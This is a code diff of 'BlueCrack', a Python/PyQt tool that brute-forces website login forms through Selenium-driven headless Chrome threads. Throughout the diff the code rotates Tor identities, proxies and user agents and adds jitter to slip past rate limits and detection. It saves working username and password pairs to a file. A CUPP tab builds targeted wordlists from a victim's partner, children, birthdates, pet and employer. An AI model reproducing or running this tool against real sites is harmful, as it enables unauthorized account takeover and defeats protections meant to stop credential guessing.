-                options.add_argument(f"user-agent={random.choice(UA)}")
-                if ctx.get("use_tor"):
-                    options.add_argument("--proxy-server=socks5://127.0.0.1:9050")
-                elif ctx.get("proxies"):
-                    options.add_argument(
-                        f"--proxy-server={random.choice(ctx['proxies'])}"
-                    )
-                if ctx.get("headless"):
-                    options.add_argument("--headless=new")
-                    options.add_argument("--disable-gpu")
-                    options.add_argument("--window-size=1920x1080")
-
-                wd = None
-                try:
-                    wd = webdriver.Chrome(options=options)
-                except Exception as e:
-                    self.log(f"[-] Thread startup error: {e}")
+            def _run_worker() -> None:
+                options = build_chrome_options(ctx)
+                wd = create_driver_safe(options)
+                if wd is None:
+                    self.log("[-] Thread startup error: could not create WebDriver")
                     return
 
-                tor_counter = 0
+                tor_counter: int = 0
                 try:
                     while (
                         not q.empty()
                         and not self._stop_flag.is_set()
                         and not _GLOBAL_STOP.is_set()
                     ):
-                        if not multiple_users and found_users:
+                        # Check max attempts
+                        if max_attempts > 0:
+                            with metrics_lock:
+                                if metrics["attempted"] >= max_attempts:
+                                    break
+
+                        if not continue_after:
+                            if not multiple_users and found_users:
+                                break
+                            # If single user and already found, stop
+                        # Even with continue_after, skip already-solved users
+                        # (unless continue_after is True in which case we still test all)
+
+                        try:
+                            user, pwd = q.get(timeout=1)
+                        except Exception:
                             break
 
-                        user, pwd = q.get()
                         if not pwd or not pwd.strip():
+                            with metrics_lock:
+                                metrics["skipped_empty"] += 1
                             q.task_done()
                             continue
 
-                        if user in found_users:
+                        if not continue_after and user in found_users:
+                            with metrics_lock:
+                                metrics["skipped_solved_user"] += 1
                             done[0] += 1
                             self.progress_signal.emit(done[0], total)
                             q.task_done()
@@ -532,105 +972,216 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
                             p_el.send_keys(pwd)
                             p_el.send_keys(Keys.ENTER)
 
+                            with metrics_lock:
+                                metrics["attempted"] += 1
+
                             self.log(f"[*] Trying: {user} / {pwd}")
                             time.sleep(1)
 
                             src = ""
                             try:
                                 src = wd.page_source.lower()
-                            except:
+                            except Exception:
                                 pass
 
+                            current_url = ""
+                            try:
+                                current_url = wd.current_url
+                            except Exception:
+                                pass
+
+                            # Rate limit check
                             if ctx.get("limit_text") and ctx["limit_text"] in src:
                                 self.log("[!] Rate limit hit!")
+                                with metrics_lock:
+                                    metrics["rate_limit_hits"] += 1
+
+                                # Check retry budget for rate limit
+                                combo_key = (user, pwd)
+                                with retry_lock:
+                                    retry_budget[combo_key] = retry_budget.get(combo_key, 0) + 1
+                                    budget_exceeded = retry_budget[combo_key] > MAX_RETRIES_PER_COMBO
+
+                                if budget_exceeded:
+                                    self.log(f"[!] Retry budget exhausted for {user}/{pwd}")
+                                    with metrics_lock:
+                                        metrics["rate_retry_exhausted"] += 1
+                                    done[0] += 1
+                                    self.progress_signal.emit(done[0], total)
+                                    q.task_done()
+                                    continue
+
                                 if ctx.get("use_tor"):
                                     change_tor_ip(ctx.get("tor_port", 9051))
                                     time.sleep(3)
                                 elif ctx.get("cooldown", 0) > 0:
                                     time.sleep(ctx["cooldown"])
+
                                 q.put((user, pwd))
+                                with metrics_lock:
+                                    metrics["requeued"] += 1
                                 q.task_done()
+                                self._emit_metrics(metrics)
                                 continue
+
+                            # Error text check
                             if ctx.get("error_msg") and ctx["error_msg"] in src:
+                                with metrics_lock:
+                                    metrics["failures"] += 1
                                 done[0] += 1
                                 self.progress_signal.emit(done[0], total)
                                 q.task_done()
+                                self._emit_metrics(metrics)
                                 continue
 
-                            found_users.add(user)
-                            self.log(f"\n[+] VALID CREDENTIALS: {user} / {pwd}")
-                            try:
-                                with open("credentials.txt", "a", encoding="utf-8") as cf:
-                                    cf.write(f"{ctx['target_url']} - {user}:{pwd}\n")
-                            except:
-                                pass
+                            # Determine success
+                            is_success = False
+                            if success_msg:
+                                if success_msg in src:
+                                    is_success = True
+                            elif current_url and current_url != ctx["target_url"] and "login" not in current_url.lower():
+                                is_success = True
+                            elif ctx.get("error_msg"):
+                                # Error message not found = potential success
+                                is_success = True
+
+                            if is_success:
+                                with _found_lock:
+                                    found_users.add(user)
+                                    found_creds.append((user, pwd))
+                                self.log(f"\n[+] VALID CREDENTIALS: {user} / {pwd}")
+                                with metrics_lock:
+                                    metrics["successes"] += 1
+                                try:
+                                    with open("credentials.txt", "a", encoding="utf-8") as cf:
+                                        cf.write(f"{ctx['target_url']} - {user}:{pwd}\n")
+                                except Exception:
+                                    pass
+
+                                done[0] += 1
+                                self.progress_signal.emit(done[0], total)
+                                q.task_done()
+                                self._emit_metrics(metrics)
+
+                                if not continue_after and not multiple_users:
+                                    with q.mutex:
+                                        q.queue.clear()
+                                    break
+
+                                # Restart browser for clean state
+                                try:
+                                    wd.quit()
+                                except Exception:
+                                    pass
+                                wd = create_driver_safe(options)
+                                if wd is None:
+                                    self.log("[-] Could not restart browser after success")
+                                    break
+                                continue
+                            else:
+                                # Ambiguous — count as failure
+                                with metrics_lock:
+                                    metrics["failures"] += 1
 
                             done[0] += 1
                             self.progress_signal.emit(done[0], total)
                             q.task_done()
-
-                            if not multiple_users:
-                                with q.mutex:
-                                    q.queue.clear()
-                                break
-
-                            # Clean state restart
-                            try:
-                                wd.quit()
-                            except:
-                                pass
-                            try:
-                                wd = webdriver.Chrome(options=options)
-                            except:
-                                pass
+                            self._emit_metrics(metrics)
 
                         except (NoSuchElementException, TimeoutException):
                             self.log(f"[-] Missing elements for {user}, retrying...")
-                            q.put((user, pwd))
+                            combo_key = (user, pwd)
+                            with retry_lock:
+                                retry_budget[combo_key] = retry_budget.get(combo_key, 0) + 1
+                                budget_exceeded = retry_budget[combo_key] > MAX_RETRIES_PER_COMBO
+
+                            if not budget_exceeded:
+                                q.put((user, pwd))
+                                with metrics_lock:
+                                    metrics["requeued"] += 1
+                            else:
+                                with metrics_lock:
+                                    metrics["rate_retry_exhausted"] += 1
+                                done[0] += 1
+                                self.progress_signal.emit(done[0], total)
+
                             q.task_done()
+                            with metrics_lock:
+                                metrics["errors"] += 1
                             try:
                                 wd.quit()
-                            except:
+                            except Exception:
                                 pass
-                            try:
-                                wd = webdriver.Chrome(options=options)
-                            except:
-                                pass
+                            wd = create_driver_safe(options)
+                            if wd is None:
+                                self.log("[-] Could not recreate browser, thread exiting")
+                                break
+
                         except Exception as e:
-                            # Catch disconnects and other errors securely
-                            q.put((user, pwd))
+                            combo_key = (user, pwd)
+                            with retry_lock:
+                                retry_budget[combo_key] = retry_budget.get(combo_key, 0) + 1
+                                budget_exceeded = retry_budget[combo_key] > MAX_RETRIES_PER_COMBO
+
+                            if not budget_exceeded:
+                                q.put((user, pwd))
+                                with metrics_lock:
+                                    metrics["requeued"] += 1
+                            else:
+                                with metrics_lock:
+                                    metrics["rate_retry_exhausted"] += 1
+                                done[0] += 1
+                                self.progress_signal.emit(done[0], total)
+
                             q.task_done()
                             msg = str(e).lower()
-                            if (
-                                "invalid session id" in msg
-                                or "detached" in msg
-                                or "out of memory" in msg
-                                or "no such window" in msg
+                            if not any(
+                                k in msg
+                                for k in (
+                                    "invalid session id",
+                                    "detached",
+                                    "out of memory",
+                                    "no such window",
+                                )
                             ):
-                                pass
-                            else:
                                 self.log(f"[-] Error trying {user}: {e}")
+                            with metrics_lock:
+                                metrics["errors"] += 1
                             try:
                                 wd.quit()
-                            except:
+                            except Exception:
                                 pass
-                            try:
-                                wd = webdriver.Chrome(options=options)
-                            except:
-                                pass
+                            wd = create_driver_safe(options)
+                            if wd is None:
+                                self.log("[-] Could not recreate browser, thread exiting")
+                                break
                 finally:
                     try:
-                        wd.quit()
-                    except:
+                        if wd:
+                            wd.quit()
+                    except Exception:
                         pass
 
-            threads = []
+            threads_list: List[threading.Thread] = []
             for _ in range(ctx["threads"]):
                 t = threading.Thread(target=_run_worker, daemon=True)
                 t.start()
-                threads.append(t)
-            for t in threads:
+                threads_list.append(t)
+            for t in threads_list:
                 t.join()
+
+            end_time = time.time()
+            self._emit_metrics(metrics)
+
+            # Auto-save JSON report
+            _save_json_report(
+                "bluecrack_gui_report.json",
+                ctx["target_url"],
+                metrics,
+                found_creds,
+                self._start_time,
+                end_time,
+            )
 
             if found_users:
                 saved_msg = f"Valid credentials found for {len(found_users)} user(s)! Saved to credentials.txt"
@@ -640,16 +1191,25 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
             else:
                 self.finished_signal.emit(False, "No valid credentials found.")
 
+        def _emit_metrics(self, metrics: Dict[str, int]) -> None:
+            """Emit a copy of the current metrics to the GUI."""
+            m = dict(metrics)
+            m["elapsed"] = time.time() - self._start_time if self._start_time else 0
+            self.metrics_signal.emit(m)
+
     # ─────────────────── CUPP Worker Thread ───────────────────
     class CuppWorkerThread(QThread):
+        """Worker thread for CUPP password profile generation."""
+
         log_signal = pyqtSignal(str)
         finished_signal = pyqtSignal(str)  # path to generated file
 
-        def __init__(self, profile):
+        def __init__(self, profile: Dict[str, Any]) -> None:
             super().__init__()
-            self.profile = profile
+            self.profile: Dict[str, Any] = profile
 
-        def run(self):
+        def run(self) -> None:
+            """Generate a CUPP wordlist from the given profile."""
             try:
                 if _cupp_mod is None:
                     self.log_signal.emit("[-] cupp.py not found in directory.")
@@ -657,15 +1217,12 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
                     return
                 _cupp_mod.read_config(os.path.join(_cupp_dir, "cupp.cfg"))
                 self.log_signal.emit("[*] Generating CUPP wordlist...")
-                # Build the profile dict that generate_wordlist_from_profile expects
                 p = self.profile
                 p.setdefault("spechars1", "n")
                 p.setdefault("randnum", "n")
                 p.setdefault("leetmode", "n")
 
-                # Mock builtins.input to prevent CUPP from hanging on "Hyperspeed Print?"
-                import builtins
-
+                # Mock builtins.input to prevent CUPP from hanging
                 original_input = builtins.input
                 builtins.input = lambda prompt="": "n"
                 try:
@@ -677,7 +1234,9 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
                 if os.path.exists(outfile):
                     with open(outfile) as f:
                         cnt = sum(1 for _ in f)
-                    self.log_signal.emit(f"[+] CUPP done! {cnt} passwords → {outfile}")
+                    self.log_signal.emit(
+                        f"[+] CUPP done! {cnt} passwords → {outfile}"
+                    )
                     self.finished_signal.emit(os.path.abspath(outfile))
                 else:
                     self.log_signal.emit("[-] CUPP generated no output.")
@@ -688,31 +1247,63 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
 
     # ─────────────────── Main GUI Window ───────────────────
     class BlueCrackGUI(QWidget):
-        def __init__(self):
+        """Main BlueCrack GUI window with tabbed interface and live stats."""
+
+        def __init__(self) -> None:
             super().__init__()
-            self.worker_thread = None
-            self.setWindowTitle("BlueCrack")
-            self.setMinimumSize(820, 700)
+            self.worker_thread: Optional[GuiWorkerThread] = None
+            self._cupp_thread: Optional[CuppWorkerThread] = None
+            self._cupp_result_path: str = ""
+            self._attack_start_time: float = 0.0
+            self._is_dark: bool = True
+            self.setWindowTitle(f"BlueCrack v{__version__}")
+            self.setMinimumSize(960, 780)
             self._build_ui()
 
-        def _build_ui(self):
+        def _build_ui(self) -> None:
+            """Construct the entire GUI layout."""
             root = QVBoxLayout(self)
-            root.setContentsMargins(16, 12, 16, 12)
+            root.setContentsMargins(18, 14, 18, 14)
             root.setSpacing(8)
 
-            # ── Title bar ──
-            title = QLabel("BLUE CRACK")
+            # ── Header Frame ──
+            header_frame = QFrame()
+            header_frame.setStyleSheet(
+                "QFrame { background: transparent; border: none; }"
+            )
+            header_layout = QHBoxLayout(header_frame)
+            header_layout.setContentsMargins(0, 0, 0, 4)
+
+            title_col = QVBoxLayout()
+            title = QLabel("BLUECRACK")
             title.setObjectName("titleLabel")
-            title.setAlignment(Qt.AlignmentFlag.AlignCenter)
-            sub = QLabel("Hydra-style Browser Brute Tester  ·  GUI Mode")
+            title.setAlignment(Qt.AlignmentFlag.AlignLeft)
+            sub = QLabel(
+                f"v{__version__}  ·  Advanced Browser Penetration Framework"
+            )
             sub.setObjectName("subtitleLabel")
-            sub.setAlignment(Qt.AlignmentFlag.AlignCenter)
-            root.addWidget(title)
-            root.addWidget(sub)
+            sub.setAlignment(Qt.AlignmentFlag.AlignLeft)
+            title_col.addWidget(title)
+            title_col.addWidget(sub)
+            header_layout.addLayout(title_col, stretch=1)
+
+            self.theme_btn = QPushButton("☀")
+            self.theme_btn.setFixedSize(36, 36)
+            self.theme_btn.setToolTip("Toggle light/dark theme")
+            self.theme_btn.setStyleSheet(
+                "QPushButton { font-size: 18px; border-radius: 18px; }"
+            )
+            self.theme_btn.clicked.connect(self._toggle_theme)
+            header_layout.addWidget(
+                self.theme_btn, alignment=Qt.AlignmentFlag.AlignTop
+            )
+            root.addWidget(header_frame)
+
+            # ── Splitter: Tabs on top, Log on bottom ──
+            self.splitter = QSplitter(Qt.Orientation.Vertical)
 
             # ── Tabs ──
             self.tabs = QTabWidget()
-            root.addWidget(self.tabs, stretch=1)
 
             # ═══ TAB 1 : Target ═══
             tgt_scroll = QScrollArea()
@@ -733,15 +1324,23 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
             )
             tgt_f.setHorizontalSpacing(12)
             tgt_f.setVerticalSpacing(12)
+
             self.url_in = QLineEdit()
             self.url_in.setPlaceholderText("https://target.com/login")
+            self.url_in.setToolTip(
+                "The full URL of the login page to attack"
+            )
             tgt_f.addRow("URL:", self.url_in)
 
             user_row = QHBoxLayout()
             self.user_in = QLineEdit()
             self.user_in.setPlaceholderText("admin  or  path/to/users.txt")
+            self.user_in.setToolTip(
+                "A single username OR path to a file with one username per line"
+            )
             user_btn = QPushButton("📂")
             user_btn.setFixedWidth(36)
+            user_btn.setToolTip("Browse for username list file")
             user_btn.clicked.connect(lambda: self._pick_file(self.user_in))
             user_row.addWidget(self.user_in)
             user_row.addWidget(user_btn)
@@ -750,8 +1349,12 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
             pass_row = QHBoxLayout()
             self.pass_in = QLineEdit()
             self.pass_in.setPlaceholderText("password  or  path/to/pass.txt")
+            self.pass_in.setToolTip(
+                "A single password OR path to a file with one password per line"
+            )
             pass_btn = QPushButton("📂")
             pass_btn.setFixedWidth(36)
+            pass_btn.setToolTip("Browse for password list file")
             pass_btn.clicked.connect(lambda: self._pick_file(self.pass_in))
             pass_row.addWidget(self.pass_in)
             pass_row.addWidget(pass_btn)
@@ -781,23 +1384,51 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
             )
             eng_f.setHorizontalSpacing(12)
             eng_f.setVerticalSpacing(12)
+
             self.threads_in = QSpinBox()
             self.threads_in.setRange(1, 50)
             self.threads_in.setValue(1)
+            self.threads_in.setToolTip(
+                "Number of parallel browser threads (more = faster but heavier)"
+            )
+
             self.delay_in = QDoubleSpinBox()
             self.delay_in.setRange(0, 120)
             self.delay_in.setSingleStep(0.5)
+            self.delay_in.setToolTip(
+                "Base delay in seconds between each login attempt"
+            )
+
             self.jitter_in = QDoubleSpinBox()
             self.jitter_in.setRange(0, 30)
             self.jitter_in.setSingleStep(0.5)
+            self.jitter_in.setToolTip(
+                "Random jitter added to delay to avoid pattern detection"
+            )
+
             self.err_in = QLineEdit("incorrect")
             self.err_in.setPlaceholderText("error text on failed login")
-            self.limit_in = QLineEdit("too many requests")
+            self.err_in.setToolTip(
+                "Text that appears on the page when a login fails (e.g. 'invalid password')"
+            )
+
+            self.limit_in = QLineEdit(DEFAULT_LIMIT_TEXT)
+            self.limit_in.setToolTip(
+                "Text indicating the server is rate-limiting requests"
+            )
+
             self.cooldown_in = QSpinBox()
             self.cooldown_in.setRange(0, 300)
             self.cooldown_in.setValue(12)
+            self.cooldown_in.setToolTip(
+                "Seconds to wait when a rate limit is detected before retrying"
+            )
+
             self.headless_cb = QCheckBox("Headless browsers (no visible window)")
             self.headless_cb.setChecked(True)
+            self.headless_cb.setToolTip(
+                "Run browsers without visible windows — faster but no visual feedback"
+            )
 
             eng_f.addRow("Threads:", self.threads_in)
             eng_f.addRow("Delay (s):", self.delay_in)
@@ -807,6 +1438,43 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
             eng_f.addRow("Cooldown (s):", self.cooldown_in)
             eng_f.addRow("", self.headless_cb)
             eng_l.addWidget(eng_grp)
+
+            # ── Advanced Options GroupBox ──
+            adv_grp = QGroupBox("  Advanced Options")
+            adv_grp.setSizePolicy(
+                QSizePolicy.Policy.Preferred, QSizePolicy.Policy.Maximum
+            )
+            adv_f = QFormLayout(adv_grp)
+            adv_f.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
+            adv_f.setFormAlignment(
+                Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop
+            )
+            adv_f.setHorizontalSpacing(12)
+            adv_f.setVerticalSpacing(12)
+
+            self.success_in = QLineEdit()
+            self.success_in.setPlaceholderText("e.g. 'Welcome back' or 'Dashboard'")
+            self.success_in.setToolTip(
+                "Text that confirms a successful login. If set, login is only valid when this text appears."
+            )
+
+            self.max_attempts_in = QSpinBox()
+            self.max_attempts_in.setRange(0, 999999)
+            self.max_attempts_in.setValue(0)
+            self.max_attempts_in.setToolTip(
+                "Maximum total attempts before stopping (0 = unlimited)"
+            )
+
+            self.continue_cb = QCheckBox("Continue testing after finding credentials")
+            self.continue_cb.setToolTip(
+                "If checked, the attack continues even after finding valid credentials"
+            )
+
+            adv_f.addRow("Success text:", self.success_in)
+            adv_f.addRow("Max attempts:", self.max_attempts_in)
+            adv_f.addRow("", self.continue_cb)
+            eng_l.addWidget(adv_grp)
+
             eng_l.addStretch()
             eng_scroll.setWidget(eng_w)
 
@@ -831,22 +1499,41 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
             )
             net_f.setHorizontalSpacing(12)
             net_f.setVerticalSpacing(12)
+
             self.tor_cb = QCheckBox("Route through Tor  (socks5://127.0.0.1:9050)")
+            self.tor_cb.setToolTip(
+                "Route all traffic through the Tor network for anonymity"
+            )
+
             self.tor_port_in = QSpinBox()
             self.tor_port_in.setRange(1024, 65535)
             self.tor_port_in.setValue(9051)
+            self.tor_port_in.setToolTip(
+                "Tor control port for requesting new identities"
+            )
+
             self.tor_every_in = QSpinBox()
             self.tor_every_in.setRange(0, 9999)
             self.tor_every_in.setValue(10)
-            self.tor_every_in.setToolTip("Shift IP every N attempts. 0 = never")
+            self.tor_every_in.setToolTip(
+                "Shift Tor IP every N attempts. 0 = never shift."
+            )
+
             self.proxy_in = QLineEdit()
-            self.proxy_in.setPlaceholderText("http://ip:port  or  path/to/proxies.txt")
+            self.proxy_in.setPlaceholderText(
+                "http://ip:port  or  path/to/proxies.txt"
+            )
+            self.proxy_in.setToolTip(
+                "A single proxy URL or path to a file with one proxy per line"
+            )
             proxy_btn = QPushButton("📂")
             proxy_btn.setFixedWidth(36)
+            proxy_btn.setToolTip("Browse for proxy list file")
             proxy_btn.clicked.connect(lambda: self._pick_file(self.proxy_in))
             proxy_row = QHBoxLayout()
             proxy_row.addWidget(self.proxy_in)
             proxy_row.addWidget(proxy_btn)
+
             net_f.addRow("", self.tor_cb)
             net_f.addRow("Tor Ctrl Port:", self.tor_port_in)
             net_f.addRow("Shift IP every:", self.tor_every_in)
@@ -865,6 +1552,7 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
             cupp_w = QWidget()
             cupp_l = QVBoxLayout(cupp_w)
             cupp_l.setSpacing(6)
+
             cupp_grp = QGroupBox("  CUPP — Common User Passwords Profiler")
             cupp_f = QFormLayout(cupp_grp)
             cupp_f.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
@@ -873,27 +1561,46 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
             )
             cupp_f.setHorizontalSpacing(12)
             cupp_f.setVerticalSpacing(8)
+
             self.cupp_name = QLineEdit()
             self.cupp_name.setPlaceholderText("Required")
+            self.cupp_name.setToolTip("Target's first name (required for CUPP)")
             self.cupp_surname = QLineEdit()
+            self.cupp_surname.setToolTip("Target's surname / last name")
             self.cupp_nick = QLineEdit()
+            self.cupp_nick.setToolTip("Target's nickname or alias")
             self.cupp_bday = QLineEdit()
             self.cupp_bday.setPlaceholderText("DDMMYYYY")
+            self.cupp_bday.setToolTip("Target's birthdate in DDMMYYYY format")
             self.cupp_partner = QLineEdit()
+            self.cupp_partner.setToolTip("Name of target's partner/spouse")
             self.cupp_partner_nick = QLineEdit()
+            self.cupp_partner_nick.setToolTip("Partner's nickname")
             self.cupp_partner_bday = QLineEdit()
             self.cupp_partner_bday.setPlaceholderText("DDMMYYYY")
+            self.cupp_partner_bday.setToolTip("Partner's birthdate in DDMMYYYY format")
             self.cupp_child = QLineEdit()
+            self.cupp_child.setToolTip("Name of target's child")
             self.cupp_child_nick = QLineEdit()
+            self.cupp_child_nick.setToolTip("Child's nickname")
             self.cupp_child_bday = QLineEdit()
             self.cupp_child_bday.setPlaceholderText("DDMMYYYY")
+            self.cupp_child_bday.setToolTip("Child's birthdate in DDMMYYYY format")
             self.cupp_pet = QLineEdit()
+            self.cupp_pet.setToolTip("Name of target's pet")
             self.cupp_company = QLineEdit()
+            self.cupp_company.setToolTip("Target's company or employer name")
             self.cupp_keywords = QLineEdit()
             self.cupp_keywords.setPlaceholderText("hacker,juice,black")
+            self.cupp_keywords.setToolTip(
+                "Comma-separated keywords related to the target"
+            )
             self.cupp_specchars = QCheckBox("Add special chars")
+            self.cupp_specchars.setToolTip("Append special characters to generated passwords")
             self.cupp_randnum = QCheckBox("Add random numbers")
+            self.cupp_randnum.setToolTip("Append random numbers to generated passwords")
             self.cupp_leet = QCheckBox("1337 mode")
+            self.cupp_leet.setToolTip("Convert letters to leet-speak equivalents")
 
             cupp_f.addRow("First Name *:", self.cupp_name)
             cupp_f.addRow("Surname:", self.cupp_surname)
@@ -914,7 +1621,9 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
             cupp_l.addWidget(cupp_grp)
 
             # Number Sequence generator
-            seq_grp = QGroupBox("  Number Sequence Generator (e.g. 2015001 to 2015002)")
+            seq_grp = QGroupBox(
+                "  Number Sequence Generator (e.g. 2015001 to 2015002)"
+            )
             seq_grp.setSizePolicy(
                 QSizePolicy.Policy.Preferred, QSizePolicy.Policy.Maximum
             )
@@ -928,17 +1637,23 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
 
             self.seq_prefix = QLineEdit()
             self.seq_prefix.setPlaceholderText("Prefix (optional)")
+            self.seq_prefix.setToolTip("Text prepended before each number")
             self.seq_start = QSpinBox()
             self.seq_start.setRange(0, 999999999)
             self.seq_start.setValue(2015000)
+            self.seq_start.setToolTip("Starting number of the sequence")
             self.seq_end = QSpinBox()
             self.seq_end.setRange(0, 999999999)
             self.seq_end.setValue(2015100)
+            self.seq_end.setToolTip("Ending number of the sequence (inclusive)")
             self.seq_pad = QSpinBox()
             self.seq_pad.setRange(0, 20)
-            self.seq_pad.setToolTip("Pad with leading zeros")
+            self.seq_pad.setToolTip(
+                "Pad numbers with leading zeros to this width"
+            )
             self.seq_suffix = QLineEdit()
             self.seq_suffix.setPlaceholderText("Suffix (optional)")
+            self.seq_suffix.setToolTip("Text appended after each number")
 
             seq_f.addRow("Prefix:", self.seq_prefix)
             seq_f.addRow("Start Number:", self.seq_start)
@@ -950,13 +1665,15 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
             cupp_btns = QHBoxLayout()
             self.cupp_gen_btn = QPushButton("🧠  Generate CUPP Profile")
             self.cupp_gen_btn.setStyleSheet(
-                "background:#238636; color:white; padding:10px; font-size:14px;"
+                "background: qlineargradient(x1:0,y1:0,x2:1,y2:0, stop:0 #b388ff, stop:1 #7c4dff);"
+                " color: white; padding: 10px; font-size: 14px; border-radius: 8px; font-weight: bold;"
             )
             self.cupp_gen_btn.clicked.connect(self._run_cupp)
 
             self.seq_gen_btn = QPushButton("🔢  Generate Sequence")
             self.seq_gen_btn.setStyleSheet(
-                "background:#1f6feb; color:white; padding:10px; font-size:14px;"
+                "background: qlineargradient(x1:0,y1:0,x2:1,y2:0, stop:0 #4f8cff, stop:1 #1d4ed8);"
+                " color: white; padding: 10px; font-size: 14px; border-radius: 8px; font-weight: bold;"
             )
             self.seq_gen_btn.clicked.connect(self._run_sequence)
 
@@ -969,71 +1686,210 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
             cupp_btns.addWidget(self.cupp_use_btn)
             cupp_l.addLayout(cupp_btns)
             cupp_l.addStretch()
-            self._cupp_result_path = ""
             cupp_scroll.setWidget(cupp_w)
 
             self.tabs.addTab(cupp_scroll, "🧠  CUPP")
 
-            # ═══ Bottom: Controls + Log ═══
+            self.splitter.addWidget(self.tabs)
+
+            # ── Log area ──
+            self.log_txt = QTextEdit()
+            self.log_txt.setReadOnly(True)
+            self.log_txt.setMinimumHeight(80)
+            self.splitter.addWidget(self.log_txt)
+
+            self.splitter.setStretchFactor(0, 3)
+            self.splitter.setStretchFactor(1, 1)
+            root.addWidget(self.splitter, stretch=1)
+
+            # ═══ Bottom Controls ═══
             ctrl_row = QHBoxLayout()
             self.start_btn = QPushButton("🚀  START ATTACK")
             self.start_btn.setStyleSheet(
-                "background:#238636; color:white; padding:12px 28px; font-size:15px; font-weight:bold; border-radius:8px;"
+                "QPushButton {"
+                "  background: qlineargradient(x1:0,y1:0,x2:1,y2:0, stop:0 #00e676, stop:1 #00c853);"
+                "  color: white; padding: 12px 28px; font-size: 15px;"
+                "  font-weight: bold; border-radius: 10px; border: none;"
+                "}"
+                "QPushButton:hover {"
+                "  background: qlineargradient(x1:0,y1:0,x2:1,y2:0, stop:0 #00c853, stop:1 #00a844);"
+                "}"
+                "QPushButton:disabled {"
+                "  background: rgba(0, 230, 118, 0.2); color: rgba(255,255,255,0.3);"
+                "}"
             )
             self.start_btn.clicked.connect(self._start_attack)
+
             self.stop_btn = QPushButton("⛔  STOP")
             self.stop_btn.setStyleSheet(
-                "background:#da3633; color:white; padding:12px 28px; font-size:15px; font-weight:bold; border-radius:8px;"
+                "QPushButton {"
+                "  background: qlineargradient(x1:0,y1:0,x2:1,y2:0, stop:0 #ff5252, stop:1 #d32f2f);"
+                "  color: white; padding: 12px 28px; font-size: 15px;"
+                "  font-weight: bold; border-radius: 10px; border: none;"
+                "}"
+                "QPushButton:hover {"
+                "  background: qlineargradient(x1:0,y1:0,x2:1,y2:0, stop:0 #d32f2f, stop:1 #b71c1c);"
+                "}"
+                "QPushButton:disabled {"
+                "  background: rgba(255, 82, 82, 0.2); color: rgba(255,255,255,0.3);"
+                "}"
             )
             self.stop_btn.setEnabled(False)
             self.stop_btn.clicked.connect(self._stop_attack)
+
             self.clear_btn = QPushButton("🗑  Clear Log")
+            self.clear_btn.setToolTip("Clear all log output")
             self.clear_btn.clicked.connect(lambda: self.log_txt.clear())
+
+            self.export_btn = QPushButton("💾  Export Log")
+            self.export_btn.setToolTip("Save the current log contents to a file")
+            self.export_btn.clicked.connect(self._export_log)
+
             ctrl_row.addWidget(self.start_btn)
             ctrl_row.addWidget(self.stop_btn)
             ctrl_row.addStretch()
+            ctrl_row.addWidget(self.export_btn)
             ctrl_row.addWidget(self.clear_btn)
             root.addLayout(ctrl_row)
 
+            # ── Progress Bar ──
             self.progress = QProgressBar()
             self.progress.setValue(0)
             root.addWidget(self.progress)
 
-            self.log_txt = QTextEdit()
-            self.log_txt.setReadOnly(True)
-            self.log_txt.setMinimumHeight(100)
-            self.log_txt.setMaximumHeight(
-                200
-            )  # Limits max height to avoid eating the whole window and forces it to be a small scrollable box
-            root.addWidget(self.log_txt)
+            # ── Live Stats Footer ──
+            footer_frame = QFrame()
+            footer_frame.setStyleSheet(
+                "QFrame {"
+                "  background: rgba(15, 23, 42, 0.6);"
+                "  border: 1px solid rgba(148, 163, 184, 0.1);"
+                "  border-radius: 8px;"
+                "  padding: 4px 8px;"
+                "}"
+            )
+            footer_layout = QHBoxLayout(footer_frame)
+            footer_layout.setContentsMargins(12, 6, 12, 6)
+            footer_layout.setSpacing(24)
+
+            def _make_stat(label_text: str, value_text: str) -> Tuple[QLabel, QLabel]:
+                lbl = QLabel(label_text)
+                lbl.setObjectName("statLabel")
+                val = QLabel(value_text)
+                val.setObjectName("statValue")
+                return lbl, val
+
+            elapsed_lbl, self.elapsed_val = _make_stat("⏱ Elapsed:", "00:00:00")
+            speed_lbl, self.speed_val = _make_stat("⚡ Speed:", "0.0/s")
+            eta_lbl, self.eta_val = _make_stat("📊 ETA:", "--:--:--")
+            hits_lbl, self.hits_val = _make_stat("🎯 Hits:", "0")
+
+            for lbl, val in [
+                (elapsed_lbl, self.elapsed_val),
+                (speed_lbl, self.speed_val),
+                (eta_lbl, self.eta_val),
+                (hits_lbl, self.hits_val),
+            ]:
+                pair = QHBoxLayout()
+                pair.setSpacing(2)
+                pair.addWidget(lbl)
+                pair.addWidget(val)
+                footer_layout.addLayout(pair)
+
+            footer_layout.addStretch()
+            root.addWidget(footer_frame)
 
             # ── Status bar line ──
             self.status_lbl = QLabel("Ready.")
-            self.status_lbl.setStyleSheet("color:#8b949e; font-size:11px; padding:4px;")
+            self.status_lbl.setStyleSheet(
+                "color: #94a3b8; font-size: 11px; padding: 4px;"
+            )
             root.addWidget(self.status_lbl)
 
-            # ── Keyboard shortcuts: Ctrl+X / Ctrl+C to stop ──
-            QShortcut(QKeySequence("Ctrl+X"), self, activated=self._stop_attack)
-            # Ctrl+C is captured by signal handler already
+            # ── Stats Timer ──
+            self._stats_timer = QTimer(self)
+            self._stats_timer.setInterval(1000)
+            self._stats_timer.timeout.connect(self._update_elapsed)
+            self._total_combos: int = 0
+            self._current_metrics: Dict[str, Any] = {}
 
-        # ── helpers ──
-        def _pick_file(self, target):
+            # ── Keyboard shortcuts ──
